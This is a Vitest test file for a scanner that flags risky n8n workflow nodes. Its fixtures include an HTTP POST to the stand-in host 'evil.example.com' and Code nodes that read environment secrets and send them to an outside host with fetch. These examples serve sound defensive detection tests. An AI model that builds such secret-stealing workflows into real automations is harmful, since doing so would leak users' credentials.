import { describe, it, expect } from 'vitest'
import { findRiskyNodes, riskyNodeNames } from './riskScan.js'

const wf = (nodes) => ({ name: 'wf', nodes, connections: {} })

describe('findRiskyNodes — httpRequest exfil shapes', () => {
  it('flags a POST to an external host', () => {
    const res = findRiskyNodes(
      wf([{ name: 'Send', type: 'n8n-nodes-base.httpRequest', parameters: { url: 'https://evil.example.com/c', method: 'POST', sendBody: true } }])
    )
    expect(res).toEqual([{ name: 'Send', kind: 'sendsData', host: 'evil.example.com' }])
  })

  it('flags PUT and PATCH but not GET', () => {
    expect(findRiskyNodes(wf([{ name: 'P', type: 'n8n-nodes-base.httpRequest', parameters: { url: 'https://a.com/x', method: 'PUT' } }])).length).toBe(1)
    expect(findRiskyNodes(wf([{ name: 'P', type: 'n8n-nodes-base.httpRequest', parameters: { url: 'https://a.com/x', method: 'PATCH' } }])).length).toBe(1)
    expect(findRiskyNodes(wf([{ name: 'G', type: 'n8n-nodes-base.httpRequest', parameters: { url: 'https://api.example.com/data', method: 'GET' } }]))).toEqual([])
  })

  it('defaults missing method to GET (not flagged)', () => {
    expect(findRiskyNodes(wf([{ name: 'N', type: 'n8n-nodes-base.httpRequest', parameters: { url: 'https://api.example.com/data' } }]))).toEqual([])
  })

  it('ignores expression/non-literal URLs it cannot parse a host from', () => {
    expect(findRiskyNodes(wf([{ name: 'N', type: 'n8n-nodes-base.httpRequest', parameters: { url: '={{ $json.url }}', method: 'POST' } }]))).toEqual([])
  })
})

describe('findRiskyNodes — Code node signals', () => {
  it('flags process.env access', () => {
    const res = findRiskyNodes(
      wf([{ name: 'Steal', type: 'n8n-nodes-base.code', parameters: { jsCode: 'return [{ json: { k: process.env.SECRET } }]' } }])
    )
    expect(res).toEqual([{ name: 'Steal', kind: 'readsEnv' }])
  })

  it('flags $env access and network calls in code', () => {
    const res = findRiskyNodes(
      wf([{ name: 'C', type: 'n8n-nodes-base.code', parameters: { jsCode: 'const k = $env.KEY; await fetch("https://x.com", {method:"POST", body:k})' } }])
    )
    expect(res.map((f) => f.kind).sort()).toEqual(['netCode', 'readsEnv'])
  })

  it('covers legacy function/functionItem node types', () => {
    expect(findRiskyNodes(wf([{ name: 'F', type: 'n8n-nodes-base.function', parameters: { functionCode: 'process.env.X' } }])).length).toBe(1)
    expect(findRiskyNodes(wf([{ name: 'FI', type: 'n8n-nodes-base.functionItem', parameters: { functionCode: 'process.env.X' } }])).length).toBe(1)
  })

  it('does not flag harmless code', () => {
    expect(findRiskyNodes(wf([{ name: 'C', type: 'n8n-nodes-base.code', parameters: { jsCode: 'return items.map(i => ({ json: { n: i.json.n * 2 } }))' } }]))).toEqual([])
  })
})

describe('findRiskyNodes — robustness', () => {
  it('handles empty / malformed workflows', () => {
    expect(findRiskyNodes(null)).toEqual([])
    expect(findRiskyNodes({})).toEqual([])
    expect(findRiskyNodes(wf([null, 42, 'x']))).toEqual([])
    expect(findRiskyNodes(wf([{ type: 'n8n-nodes-base.code' }]))).toEqual([])
  })

  it('does not flag ordinary nodes', () => {
    expect(
      findRiskyNodes(
        wf([
          { name: 'T', type: 'n8n-nodes-base.scheduleTrigger', parameters: {} },
          { name: 'S', type: 'n8n-nodes-base.slack', parameters: { channel: '#x', text: 'hi' } },
          { name: 'Set', type: 'n8n-nodes-base.set', parameters: { values: { string: [{ name: 'a', value: 'b' }] } } },
        ])
      )
    ).toEqual([])
  })
})

describe('riskyNodeNames', () => {
  it('deduplicates node names across multiple findings', () => {
    const res = findRiskyNodes(
      wf([{ name: 'C', type: 'n8n-nodes-base.code', parameters: { jsCode: 'process.env.X; fetch("https://x.com")' } }])
    )
    expect(res.length).toBe(2)
    expect(riskyNodeNames(res)).toEqual(['C'])
  })
})
